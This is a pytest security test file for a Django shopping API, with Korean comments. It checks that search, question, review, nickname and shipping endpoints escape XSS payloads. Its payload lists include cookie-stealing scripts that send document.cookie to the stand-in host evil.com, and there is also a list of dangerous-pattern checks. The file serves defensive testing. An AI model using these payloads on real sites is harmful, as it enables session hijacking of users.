"""
XSS (Cross-Site Scripting) 테스트
=================================

XSS 공격 시도에 대해 API가 적절히 방어하는지 검증합니다.

실행 방법:
    pytest shopping/tests/schema/stress/security/test_xss.py -v --no-cov
"""

import json

import pytest
from rest_framework import status


@pytest.mark.security
@pytest.mark.negative
@pytest.mark.schema
@pytest.mark.django_db(transaction=True)
class TestXSS:
    """
    🔐 XSS (Cross-Site Scripting) 테스트

    XSS 페이로드를 주입하여 API가 적절히 방어하는지 검증합니다.
    """

    @pytest.mark.parametrize(
        "xss_payload",
        [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<body onload=alert('xss')>",
            "'\"><script>alert('xss')</script>",
            "<iframe src='javascript:alert(1)'>",
        ],
        ids=[
            "script_tag",
            "img_onerror",
            "javascript_uri",
            "svg_onload",
            "body_onload",
            "quote_escape",
            "iframe_js",
        ],
    )
    def test_xss_attempt_in_search(self, client, xss_payload):
        """
        XSS 시도 테스트 (검색 파라미터)

        XSS 페이로드를 검색 파라미터에 주입하여
        응답에서 이스케이프 처리되는지 확인합니다.

        🔍 검증 포인트:
        - 서버 에러 발생하지 않음
        - 응답에 스크립트 태그가 그대로 포함되지 않음
        """
        # Arrange - xss_payload is provided by parametrize

        # Act
        response = client.get(f"/api/products/?search={xss_payload}")

        # Assert - 5xx 에러 없음
        assert response.status_code < 500, f"XSS 페이로드로 서버 에러 발생!\n" f"payload={xss_payload}"

        # Assert - XSS 페이로드가 그대로 반영되지 않음
        # JSON 응답이므로 HTML 이스케이프가 덜 중요하지만 확인
        if response.status_code == status.HTTP_200_OK:
            content = response.content.decode("utf-8", errors="ignore")
            # 스크립트 태그가 그대로 포함되면 위험
            assert "<script>alert" not in content.lower(), f"XSS 페이로드가 응답에 포함됨!\n" f"payload={xss_payload}"

    def test_xss_attempt_in_post_data(self, client, auth_headers, schema_test_product):
        """
        XSS 시도 테스트 (POST 데이터)

        상품 문의 등 사용자 입력을 받는 API에 XSS 페이로드를 주입하여
        저장 및 반환 시 이스케이프 처리되는지 확인합니다.

        🔍 검증 포인트:
        - 저장 시 에러 발생하지 않음
        - 반환 시 스크립트가 실행 가능한 형태로 포함되지 않음
        """
        # Arrange
        headers = {"HTTP_AUTHORIZATION": auth_headers["Authorization"]}
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
        ]

        for payload in xss_payloads:
            data = {"content": payload}

            # Act - 상품 문의 작성 시도
            response = client.post(
                f"/api/products/{schema_test_product.id}/questions/",
                data=json.dumps(data),
                content_type="application/json",
                **headers,
            )

            # Assert - 5xx 에러 없음
            assert response.status_code < 500, f"XSS 페이로드로 서버 에러 발생!\n" f"payload={payload}"

            # 성공적으로 저장된 경우, 반환값 확인
            if response.status_code in [status.HTTP_200_OK, status.HTTP_201_CREATED]:
                content = response.content.decode("utf-8", errors="ignore")
                # 실행 가능한 스크립트 태그가 그대로 포함되면 안 됨
                assert "<script>alert" not in content, "XSS 페이로드가 응답에 포함됨!"


@pytest.mark.security
@pytest.mark.negative
@pytest.mark.schema
@pytest.mark.django_db(transaction=True)
class TestStoredXSS:
    """
    🔐 Stored XSS 테스트

    XSS 페이로드를 저장한 후 조회할 때 스크립트가 실행되지 않도록
    이스케이프 처리가 제대로 되는지 검증합니다.

    📋 테스트 시나리오:
    - 상품 문의에 XSS 저장 후 조회
    - 리뷰에 XSS 저장 후 조회
    - 프로필/닉네임에 XSS 저장 후 조회
    """

    XSS_PAYLOADS = [
        "<script>document.location='http://evil.com/?c='+document.cookie</script>",
        "<img src=x onerror='fetch(\"http://evil.com?c=\"+document.cookie)'>",
        "<svg/onload=alert(String.fromCharCode(88,83,83))>",
        "<body onpageshow=alert('XSS')>",
        "'\"><script>new Image().src='http://evil.com/c='+document.cookie</script>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
    ]

    def test_stored_xss_in_product_question(self, client, auth_headers, schema_test_product):
        """
        상품 문의에 XSS 저장 후 조회 테스트

        상품 문의에 XSS 페이로드를 저장한 후
        해당 문의 조회 시 스크립트가 실행 가능한 형태로
        반환되지 않는지 확인합니다.

        🔍 검증 포인트:
        - 저장 시 서버 에러 없음
        - 조회 시 스크립트 태그가 이스케이프됨
        - 조회 시 이벤트 핸들러가 무효화됨
        """
        headers = {"HTTP_AUTHORIZATION": auth_headers["Authorization"]}

        for payload in self.XSS_PAYLOADS:
            # Step 1: XSS 페이로드가 포함된 문의 작성
            create_data = {"content": payload}

            create_response = client.post(
                f"/api/products/{schema_test_product.id}/questions/",
                data=json.dumps(create_data),
                content_type="application/json",
                **headers,
            )

            # Assert - 저장 시 서버 에러 없음
            assert create_response.status_code < 500, f"XSS 저장 시 서버 에러!\npayload={payload}"

            # Step 2: 저장이 성공했다면 조회하여 확인
            if create_response.status_code in [status.HTTP_200_OK, status.HTTP_201_CREATED]:
                # 문의 목록 조회
                list_response = client.get(
                    f"/api/products/{schema_test_product.id}/questions/",
                    **headers,
                )

                assert list_response.status_code < 500, "문의 목록 조회 시 서버 에러!"

                if list_response.status_code == status.HTTP_200_OK:
                    content = list_response.content.decode("utf-8", errors="ignore")

                    # 위험한 패턴이 그대로 포함되지 않아야 함
                    dangerous_patterns = [
                        "<script>",
                        "onerror=",
                        "onload=",
                        "onfocus=",
                        "onpageshow=",
                        "onstart=",
                        "javascript:",
                    ]

                    for pattern in dangerous_patterns:
                        # JSON으로 인코딩되면 < 는 \u003c 등으로 변환될 수 있음
                        # 원본 그대로 포함되면 안 됨
                        assert pattern.lower() not in content.lower() or "\\u" in content, (
                            f"위험한 패턴이 이스케이프 없이 응답에 포함됨!\n" f"pattern={pattern}\npayload={payload}"
                        )

    def test_stored_xss_in_product_review(self, client, auth_headers, schema_test_product, user):
        """
        상품 리뷰에 XSS 저장 후 조회 테스트

        리뷰 내용에 XSS 페이로드를 저장한 후
        상품 조회 시 스크립트가 실행 가능한 형태로
        반환되지 않는지 확인합니다.

        🔍 검증 포인트:
        - 리뷰 저장 시 서버 에러 없음
        - 상품 상세 조회 시 XSS 페이로드 이스케이프
        """
        headers = {"HTTP_AUTHORIZATION": auth_headers["Authorization"]}

        xss_review_content = "<script>alert('stored_xss_in_review')</script>악의적인 리뷰입니다"

        # Step 1: XSS가 포함된 리뷰 작성
        review_data = {
            "rating": 5,
            "content": xss_review_content,
        }

        create_response = client.post(
            f"/api/products/{schema_test_product.id}/reviews/",
            data=json.dumps(review_data),
            content_type="application/json",
            **headers,
        )

        # Assert - 저장 시 서버 에러 없음
        assert create_response.status_code < 500, f"리뷰 XSS 저장 시 서버 에러!\nstatus_code={create_response.status_code}"

        # Step 2: 상품 상세 조회하여 리뷰 확인
        detail_response = client.get(f"/api/products/{schema_test_product.id}/")

        assert detail_response.status_code < 500, "상품 상세 조회 시 서버 에러!"

        if detail_response.status_code == status.HTTP_200_OK:
            content = detail_response.content.decode("utf-8", errors="ignore")

            # 실행 가능한 스크립트 태그가 그대로 포함되면 안 됨
            assert "<script>alert" not in content, "리뷰의 XSS 페이로드가 이스케이프 없이 응답에 포함됨!"

    def test_stored_xss_in_username_reflection(self, client, db):
        """
        사용자명에 XSS 저장 후 반영 테스트

        사용자명이나 닉네임에 XSS 페이로드를 저장한 후
        해당 정보가 다른 API 응답에 반영될 때
        이스케이프 처리되는지 확인합니다.

        🔍 검증 포인트:
        - 닉네임/사용자명 저장 시 서버 에러 없음
        - 다른 사용자가 조회 시 XSS 실행 불가
        """
        from shopping.tests.factories import UserFactory

        # XSS가 포함된 닉네임으로 사용자 생성 시도
        xss_username = "<script>alert('xss')</script>user"

        # UserFactory를 통한 생성 시도
        try:
            user = UserFactory(
                username="xss_test_user",
                nickname=xss_username,
            )

            # 로그인하여 토큰 획득
            login_response = client.post(
                "/api/auth/login/",
                data=json.dumps(
                    {
                        "username": user.username,
                        "password": "testpass123",
                    }
                ),
                content_type="application/json",
            )

            if login_response.status_code == status.HTTP_200_OK:
                data = login_response.json()
                token = data.get("access") or data.get("token", {}).get("access")
                headers = {"HTTP_AUTHORIZATION": f"Bearer {token}"}

                # 프로필 조회
                profile_response = client.get("/api/auth/profile/", **headers)

                if profile_response.status_code == status.HTTP_200_OK:
                    content = profile_response.content.decode("utf-8", errors="ignore")

                    # 스크립트 태그가 그대로 포함되면 안 됨
                    assert "<script>alert" not in content, "프로필의 XSS 페이로드가 이스케이프 없이 응답에 포함됨!"

        except Exception:
            # 사용자 생성 실패는 정상 (검증이 동작한 것)
            pass

    def test_xss_in_order_shipping_info(self, client, auth_headers, schema_test_product):
        """
        주문 배송 정보에 XSS 저장 후 조회 테스트

        배송지 주소나 수령인 이름에 XSS 페이로드를 저장한 후
        주문 조회 시 이스케이프 처리되는지 확인합니다.

        🔍 검증 포인트:
        - 주문 생성 시 서버 에러 없음
        - 주문 조회 시 XSS 페이로드 이스케이프
        """
        headers = {"HTTP_AUTHORIZATION": auth_headers["Authorization"]}

        # 장바구니에 상품 추가
        cart_response = client.post(
            "/api/cart/add_item/",
            data=json.dumps(
                {
                    "product_id": schema_test_product.id,
                    "quantity": 1,
                }
            ),
            content_type="application/json",
            **headers,
        )

        if cart_response.status_code not in [status.HTTP_200_OK, status.HTTP_201_CREATED]:
            pytest.skip("장바구니 추가 실패로 테스트 스킵")

        # XSS가 포함된 배송 정보로 주문 생성
        xss_address = "<script>alert('xss_in_address')</script>서울시 강남구"
        xss_name = "<img src=x onerror=alert('xss')>홍길동"

        order_data = {
            "shipping_address": xss_address,
            "shipping_name": xss_name,
            "shipping_phone": "010-1234-5678",
            "shipping_postal_code": "12345",
            "payment_method": "card",
        }

        create_response = client.post(
            "/api/orders/",
            data=json.dumps(order_data),
            content_type="application/json",
            **headers,
        )

        # Assert - 주문 생성 시 서버 에러 없음
        assert create_response.status_code < 500, (
            f"XSS 배송정보로 주문 생성 시 서버 에러!\n" f"status_code={create_response.status_code}"
        )

        # 주문이 생성되었다면 조회하여 확인
        if create_response.status_code in [status.HTTP_200_OK, status.HTTP_201_CREATED, status.HTTP_202_ACCEPTED]:
            # 주문 목록 조회
            list_response = client.get("/api/orders/", **headers)

            if list_response.status_code == status.HTTP_200_OK:
                content = list_response.content.decode("utf-8", errors="ignore")

                # 위험한 패턴 체크
                assert "<script>alert" not in content, "주문의 XSS 페이로드가 이스케이프 없이 응답에 포함됨!"
                assert "onerror=alert" not in content, "주문의 이벤트 핸들러가 이스케이프 없이 응답에 포함됨!"
